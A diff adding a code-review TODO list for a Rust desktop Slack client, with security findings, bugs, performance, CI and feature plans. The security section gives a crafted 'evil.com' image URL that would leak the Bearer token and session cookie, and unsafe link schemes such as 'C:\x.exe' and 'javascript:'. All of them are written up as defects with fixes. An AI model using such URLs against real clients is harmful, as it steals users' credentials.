@@ -1,0 +1,413 @@
+# TODO
+
+Findings from a code review at `684c148`. Line numbers are as of that
+commit. When this review was written, `cargo fmt`, clippy (`-D warnings`)
+and all 59 tests passed.
+
+## P0: Security
+
+- [x] **Credentials leak to any host whose URL contains `files.slack.com`.**
+      `ui/mod.rs:177` uses `url.contains(..)`, and then `slack/client.rs:292,383`
+      attaches `Bearer` and `Cookie: d=` to any host. A bot, webhook or link
+      preview with `image_url: https://evil.com/x.png?files.slack.com`
+      (or `files.slack.com.evil.com`) is enough to send the token out.
+      - Fix in two places: parse the URL in `image_uri`, and check again in
+        `get_bytes` before adding credentials (`https` plus an exact host
+        allowlist).
+      - Apply the same check to `Command::Download` (`backend/worker.rs:533`).
+      - Add tests with hostile URLs.
+- [x] **Links with any scheme are passed to `open::that_detached`.**
+      In `mrkdwn.rs:253`, any target that contains `:` becomes a link. That
+      includes `C:\x.exe`, `file://`, `smb://` and `javascript:`.
+      - Allow only `http`, `https` and `mailto` (and `slack://`, handled
+        internally). Show other schemes as plain text, or ask before opening.
+- [x] **Image decompression bombs.** `MAX_IMAGE_BYTES` limits only the
+      compressed size (`images.rs:25`). egui_extras decodes with no size
+      limit, decodes every GIF frame, and never evicts decoded textures.
+      - Write our own loader: read the dimensions first, set
+        `image::Limits`, cap the number of GIF frames, and downscale to the
+        size the image is shown at.
+- [x] **Panic messages skip `redact_tokens`** (`main.rs:112`). Apply both
+      redaction rules, or use `PanicMessage::Omit`.
+- [x] **`redact_tokens` gaps** (`main.rs:190`). It misses:
+      - `xoxa-`, `xoxr-` and `xoxs-` tokens
+      - `wss://` socket URLs
+      - the OAuth client secret, which `Debug` prints on `AppCredentials`
+        and `OauthApp`
+
+      Then:
+      - Move `redact_tokens` into the lib and add tests.
+      - Hand-write `Debug` for the types that hold secrets.
+- [x] **Private files stay on disk after sign-out.** Keep authed images in a
+      per-team cache folder, delete it on sign-out, and call `forget_all`
+      (`images.rs:107`).
+- [x] **Loopback OAuth listener** (`auth.rs:197`) ends on the first
+      `/callback` request, whatever its state. Keep listening until the
+      expected `state` arrives, and match the path exactly.
+- [x] **Session sign-in** (`slack/session.rs`):
+      - `normalize_workspace` (`:43`) accepts any host with a dot. Restrict
+        it to `*.slack.com` and enterprise domains.
+      - The seeded client (`:101`) has no timeouts.
+- [x] **Single-instance socket** (`single_instance.rs:82`):
+      - `read_line` is unbounded and there is no per-connection deadline.
+      - `0o600` applies only when the file is created. Call
+        `set_permissions` on the existing file too.
+- [x] **Demo folder** `/tmp/noslacking-demo` (`main.rs:96`) is shared by
+      all users and can be pre-created as a symlink. Use a per-user temp dir.
+
+## P1: Correctness bugs
+
+### Data loss and wrong results
+
+- [ ] **Editing a message breaks its mentions and links.** `StartEdit`
+      uses `unescape` (`app.rs:1519`) and `Edit` uses `escape` (`:1465`),
+      so `<@U123>` is saved as `&lt;@U123&gt;`.
+      - Convert the wire text into editable text, seed `Draft.mentions`,
+        and save through `to_wire`.
+      - Add a round-trip test.
+- [ ] **A picked file can upload to the wrong conversation.** `PickUpload`
+      looks up the team and channel when the dialog closes
+      (`app.rs:1576`). Capture them when the button is pressed.
+- [ ] **Failed optimistic edits, deletes and reactions are never undone**
+      (`app.rs:1337,1460`). Return per-request result events with the
+      original state, as `Sent` already does.
+- [ ] **Sign-out does not cancel `boot` or `unread_sweep`.** A late
+      `WorkspaceReady` re-adds the signed-out workspace
+      (`worker.rs:204,1044`).
+      - Store a cancellation handle per team, or drop events for unknown
+        teams.
+- [ ] **Commands for an unknown team fail silently.** The optimistic send
+      then stays pending forever (`worker.rs:371,409,549`). Emit
+      `Sent { Err }` or `Event::Error`.
+- [ ] **Settings: one invalid field resets everything**, and the next save
+      overwrites the file (`settings.rs:110`).
+      - Back up the bad file before saving.
+      - Deserialize leniently, field by field.
+      - Add a `version` field.
+- [ ] **Manifest scopes are missing.** `conversations.mark` needs
+      `channels:write`, `groups:write`, `im:write` and `mpim:write`, and the
+      stars calls need `stars:read` and `stars:write`. Without these,
+      marking as read fails for OAuth users.
+      - Remove `reactions:read`, which is unused.
+
+### Real-time, polling and rate limits
+
+- [ ] **One global `socket_up` flag covers every workspace and both socket
+      kinds** (`worker.rs:66,822-896`). An RTM connection for workspace A
+      stops polling for workspace B. Track liveness per team.
+- [ ] **Polling piles up under rate limits** (`worker.rs:893`,
+      `client.rs:243`).
+      - A new history task starts every 6 s with no in-flight check.
+      - Requests hold their semaphore permit while sleeping on
+        `Retry-After`, so sends starve.
+- [ ] **RTM gives up for good after 3 quick failures** (`rtm.rs:86`), for
+      example while Wi-Fi reconnects after sleep. Keep retrying network
+      errors with capped backoff.
+- [ ] **A stale RTM `Unavailable` can kill the replacement socket**
+      (`worker.rs:854`). Tag each socket with a generation id.
+- [ ] **Socket Mode `disconnect` reconnects immediately**, which can loop
+      hot (`socket.rs:125`).
+      - Treat `link_disabled` as fatal.
+      - Apply backoff to short-lived connections.
+      - Honour `Retry-After` in `open_url`.
+
+### Tokens and keyring
+
+- [ ] **Failed token refresh** (`client.rs:195`):
+      - It retries on every API call.
+      - `invalid_refresh_token` and `invalid_grant` are not in `is_auth`,
+        so the user never reaches the signed-out state.
+- [ ] **Rotated tokens can be saved out of order** (`worker.rs:179`).
+      - Refreshes call `tokio::spawn(save_token)` and don't wait.
+      - `SaveApp` builds new `Client`s with a separate `refresh_lock`.
+      - Save inside the refresh critical section, and share one token and
+        lock per team.
+- [ ] **Keyring calls block the worker loop** (`worker.rs:118,272`), for
+      example while a Secret Service unlock prompt is open. Spawn them.
+- [ ] **A keyring error at boot leaves the remaining workspaces in limbo**
+      (`worker.rs:160`). Emit `SignedOut` for each one that was skipped.
+
+### Files
+
+- [ ] **The 120 s total timeout breaks large uploads and downloads**
+      (`client.rs:147`). Use a separate client or a per-request timeout
+      for transfers.
+- [ ] **Uploads and downloads buffer up to 1 GB in memory**
+      (`worker.rs:496,533`). Stream the body and write to a temp file
+      followed by a rename.
+
+### Unread state and counters
+
+- [ ] **`Event::Read` can move the read marker backwards** (`app.rs:795`).
+      Use `max_ts`, and only clear counts when the marker is at or past
+      `latest`.
+- [ ] **Unread counts stick** after reading on another device
+      (`app.rs:1664`). Make `unread` an `Option`, or clear it when
+      `last_read >= latest`.
+- [ ] **`message_changed` raises the reply count and mention count**
+      (`app.rs:959,988`). Flag edits on the event.
+- [ ] **Reply counts after deletes:**
+      - Deleting a reply doesn't lower the parent's `reply_count`.
+      - An edit with `reply_count == 0` keeps the old count
+        (`model.rs:451`).
+
+### Scroll, threads and focus
+
+- [ ] **A global `scroll_to_bottom` flag** makes a thread reply yank the
+      main list down (`app.rs:1287,938`). Key it by list.
+- [ ] **A stale `prepended` anchor** survives switching conversations
+      (`conversation.rs:253`).
+- [ ] **Open threads outlive their source:**
+      - An open thread isn't closed when its conversation disappears.
+      - Deleting a parent leaves an empty thread panel open.
+- [ ] **The edit field traps focus and swallows Escape** before overlays
+      (`message.rs:319,336`).
+- [ ] **The same message can get two edit fields with one Id** when its
+      thread parent is shown in both panels (`message.rs:65,311`).
+
+### Composer and pickers
+
+- [ ] **The suggestion popup can't be dismissed.** Enter always accepts,
+      so a message like "@chan" can't be sent as typed
+      (`composer.rs:157`).
+- [ ] **`to_wire` mention labels:**
+      - Labels are replaced anywhere in the text: "@Ann" plus "@Annabel"
+        gives `<@U1>abel`.
+      - `replace_word` checks the boundary against `rest` instead of the
+        full text.
+- [ ] **Enter in the emoji picker** with an empty query reacts with the
+      first custom emoji (`overlays.rs:292`).
+- [ ] **The settings "Save" button** doesn't check `can_sign_in()`
+      (`settings.rs:278`).
+
+### Pagination and fetch caches
+
+- [ ] **Pagination stops silently** (worker.rs):
+      - threads are capped at 2000 replies
+      - `stars.list` reads one page
+      - section `channel_ids_page` cursors are ignored
+      - `users.list` stops at 40 pages
+
+      Follow the cursors, or log when a cap is hit.
+- [ ] **`users_requested` and `bots_requested` are never cleared**, so a
+      transient failure means that user is never fetched again
+      (`worker.rs:615,648`).
+- [ ] **Failed images never retry** (`images.rs:182`). Add a backoff.
+
+### Sidebar
+
+- [ ] **Local section ids can collide** (`sidebar.rs:334`), and
+      `local-*` ids are sent to Slack.
+- [ ] **Shift and Star edge cases** (`sidebar.rs:356,113`):
+      - Shift swaps with hidden neighbours.
+      - Starring with no Starred section changes nothing locally but still
+        calls Slack.
+
+### Minor
+
+- [ ] **Download naming** (`worker.rs:1476`):
+      - The `exists()` check is a TOCTOU race; use `create_new`.
+      - Names aren't safe on Windows (`<>:"|?*`, `CON`, trailing dots).
+      - Long names aren't truncated.
+- [ ] **The startup error log** comes before logger init and is lost
+      (`main.rs:100`).
+- [ ] **`write_atomic`** (`paths.rs:299`) doesn't fsync, and its fixed
+      `.tmp` name races between writers.
+- [ ] **mrkdwn edge cases:**
+      - `<!foo>` is drawn as a broadcast.
+      - Word boundaries are ASCII-only.
+      - Double-backtick code isn't handled.
+      - A quote is lost before a fenced block.
+      - Emoji need no boundary, so `10:30:00` matches `:30:`.
+- [ ] **Small UI errors:**
+      - The `short_time` doc comment is wrong (`ui/mod.rs:110`).
+      - The rail badge shows "9" instead of "9+" (`sidebar.rs:75`).
+
+## P2: Performance
+
+- [ ] **The mrkdwn parser is quadratic.** One 40 KB message of
+      `"*a "` takes about 600 ms to parse (release build), and that
+      happens every frame (`mrkdwn.rs:190,222`). Make it linear.
+- [ ] **The whole history is laid out every frame** (`conversation.rs:332`,
+      `rich.rs:80`, `message.rs:813`):
+      - Use `show_viewport` with cached row heights.
+      - Cache parsed blocks per `(ts, edited)`.
+      - Build reaction hover text lazily.
+- [ ] **Composer autocomplete** rescans and re-lowercases every user on
+      every frame (`composer.rs:61`). Cache results by query.
+- [ ] **The emoji picker** filters and paints about 1,900 emoji every frame
+      (`overlays.rs:342`). Use `show_rows` and a per-query cache.
+- [ ] **Settings are written on the UI thread every frame while dragging**
+      (`sidebar.rs:268`, `thread.rs:188`, `app.rs:514`). Debounce the save
+      and move it off-thread.
+- [ ] **`sidebar::layout` is recomputed every frame.** Memoise it by a
+      generation counter.
+- [ ] **The disk image cache is never pruned.** Add an LRU size cap.
+- [ ] **The boot unread sweep** makes 1–2 sequential calls per
+      conversation (`worker.rs:1350`). Use `client.counts` or
+      `users.counts` where available.
+
+## P2: Accessibility and i18n
+
+- [ ] **Custom-painted buttons and rows have no AccessKit info.** Call
+      `widget_info` in `theme::icon_button` and the row helpers, and link
+      fields with `labelled_by`.
+- [ ] **Message actions are mouse-only.** Add a focused-message state with
+      shortcuts (r, e, Del).
+- [ ] **Keyboard issues:**
+      - Alt+↑/↓ is consumed inside text fields (`keys.rs:30`).
+      - Overlays re-grab focus every frame, so Tab can't reach their
+        buttons.
+      - The edit field saves on Enter even when "Enter sends" is off.
+      - The filter's hint says "Ctrl+K", which opens the switcher.
+- [ ] **i18n gaps:**
+      - Dates use English `strftime` names.
+      - Some sentences are glued from pieces; use `{name}` placeholders.
+      - Emoji group names come from `Debug`.
+      - Shortcuts show "Ctrl" on macOS.
+      - "Notify everyone here" is shown for @channel and @everyone too.
+
+## P3: Architecture and maintainability
+
+- [ ] **Views call `app.backend.send` and `open::that_detached`
+      directly** (`login.rs`, `settings.rs`). Route these through
+      `Action`s.
+- [ ] **Split the large functions:**
+      - `Worker::command` (about 320 lines)
+      - `App::handle` and `App::apply` (220+ lines each)
+      - `edit_sidebar`
+- [ ] **Shared helpers to add:**
+      - an active-workspace lookup (copied 5 times)
+      - `timelines_for(channel)` (6 copies with inconsistent filtering)
+      - a `paginate` helper (4 hand-written loops)
+      - `From<reqwest::Error>` for `SlackError`
+- [ ] **Auth error codes** live in `is_auth`, `describe` and
+      `socket::is_fatal`, and the three lists disagree. Use one list.
+- [ ] **Make `App` testable without a backend**, for example by moving
+      the event and action handlers onto `WorkspaceState`.
+
+## P3: Tests
+
+- [ ] Hostile-URL tests for `image_uri`, `images::split` and `get_bytes`.
+- [ ] `redact_tokens`, `describe`, `safe_name` (Windows cases), `backoff`,
+      `normalize_workspace`, and `parse_callback` with duplicate params.
+- [ ] Optimistic reconciliation, `Event::Read` ordering,
+      `merge_conversation`, and the edit round-trip.
+- [ ] Composer `suggestions` and `replace_word` with multibyte text, and
+      `keys::step`.
+- [ ] mrkdwn:
+      - unterminated `<`, `<!subteam^…>` and `<!date^…>`
+      - a fuzz or proptest target asserting that parsing never panics
+      - a 40 KB time-budget test
+- [ ] Settings: a corrupt file, a newer-version file, and `write_atomic`.
+- [ ] Sidebar `apply` with local ids, and byte-cache eviction.
+
+## P3: CI, dependencies and packaging
+
+- [ ] **CI triggers on `main`, but the working branch is `master`.**
+      Rename the branch or add it to the triggers.
+- [ ] **Two toolchains get installed.** Use the pinned toolchain
+      (`@1.98.0` or `rustup show`) instead of `dtolnay/...@stable`.
+- [ ] **Run clippy and the non-demo build on macOS and Windows too**,
+      since the `cfg` code there is never linted.
+- [ ] **Add `cargo-deny`** for advisories, licenses and a `sources`
+      allowlist for the git deps.
+- [ ] **Pin actions by SHA.**
+- [ ] **Add a release job** that builds the binaries and packages.
+- [ ] **Add a `LICENSE` file.** `Cargo.toml` says MIT, but the repo has
+      none.
+- [ ] **Bump `sha1`, `sha2` and `rand`** to the versions the transitive
+      deps use, to reduce duplicate crates.
+- [ ] **Consider not embedding 12.6 MB of emoji fonts**: load them from
+      the system, or compress them.
+- [ ] **Packaging:**
+      - The `.desktop` file has `Icon=cloud.yannick.NoSlacking`, but the
+        icons are named `noslacking-*.png`.
+      - Add AppStream metainfo.
+      - Run `desktop-file-validate` in CI.
+      - Add macOS and Windows packaging.
+
+## Features
+
+These are missing compared with the official client, roughly in order of
+value. The backend's `Command`s cover sign-in, history, threads, send,
+edit, delete, react, upload, download, mark-read, users and sidebar
+sections. Nothing below exists yet.
+
+### Expected of any chat client
+
+- [ ] **Desktop notifications** for DMs, mentions and keywords, with
+      per-channel settings, plus a taskbar/dock unread badge (fastframe-shell
+      may help). Without this the client can't replace Slack.
+- [ ] **Search**: `search.messages` and `search.files`, with
+      `from:`/`in:`/`before:` filters and jump-to-message with context.
+- [ ] **Start conversations**: open a DM or group DM (`conversations.open`),
+      browse and join or leave channels, create a channel.
+- [ ] **Presence and typing**: green dots, `user_typing` over RTM and Socket
+      Mode, and setting yourself away.
+- [ ] **Your own status and DND**: set the status emoji, text and expiry,
+      and snooze notifications (`dnd.setSnooze`).
+- [ ] **Mute and unmute channels**, honouring Slack's muted list so muted
+      channels don't count as unread.
+- [ ] **Persistent drafts** per conversation and thread across restarts,
+      plus a Drafts list.
+- [ ] **Jump to a message**: copy a message link, open `slack://` and
+      `https://…/archives/C…/p…` permalinks inside the app, and jump to
+      the unread line or to the newest message.
+
+### Productivity views
+
+- [ ] **Activity / Mentions**: one list of mentions and replies across
+      channels.
+- [ ] **All unreads**: one list of every unread message.
+- [ ] **Threads**: a list of threads you follow, with unread replies.
+- [ ] **Saved for later and reminders** (`reminders.add`, or the newer
+      saved-items API on session tokens).
+- [ ] **Pins and bookmarks** in a channel header panel (`pins.list`,
+      `bookmarks.list`).
+- [ ] **Scheduled messages** (`chat.scheduleMessage`) and "send later" in
+      the composer.
+- [ ] **Channel details**: topic, purpose, members, files, and editing the
+      topic.
+- [ ] **Profile card** on clicking a name: local time, title, status, and
+      a "Message" button.
+
+### Composer and rendering
+
+- [ ] **Syntax highlighting** in code blocks (e.g. `syntect`, behind a
+      feature flag), and a copy button.
+- [ ] **Formatting toolbar and shortcuts** (Ctrl+B/I/Shift+X), a live
+      preview of mrkdwn, and Up-arrow to edit your last message.
+- [ ] **Paste images** from the clipboard and drag-and-drop files in the
+      composer, with upload progress and cancel.
+- [ ] **Spell checking** (system spellchecker, or `hunspell` behind a
+      feature).
+- [ ] **Slash commands** (`/remind`, `/status`, `/invite`) and `#channel`
+      autocomplete.
+- [ ] **Rich unfurls** for link previews, video and audio file playback or
+      a "play externally" option, and PDF thumbnails.
+- [ ] **Image viewer**: a full-size lightbox with zoom and arrow-key
+      navigation through the channel's images.
+- [ ] **Emoji**: skin tones, recently used, and a frequent-reactions row.
+
+### Desktop integration
+
+- [ ] **System tray** with an unread indicator and close-to-tray, and
+      start on login.
+- [ ] **`slack://` URL handler** registration so links open in NoSlacking.
+- [ ] **Offline cache**: keep recent history on disk so start-up is instant
+      and the client works read-only offline. Keep the cache encrypted, or
+      at least per-team and wiped on sign-out.
+- [ ] **Proxy settings** (HTTP or SOCKS) for corporate networks.
+- [ ] **Multi-window**: pop a conversation out into its own window.
+- [ ] **Compact / IRC-style density**, and an option to hide avatars and
+      images.
+
+### Bigger bets
+
+- [ ] **Enterprise Grid / Slack Connect**: shared channels, external user
+      badges, and org-level sign-in.
+- [ ] **Huddles and calls**: probably out of scope. At least show "huddle
+      in progress" and open it in the browser.
+- [ ] **Plugins or scripting hooks** for keyword alerts and auto-replies,
+      in the spirit of wee-slack.
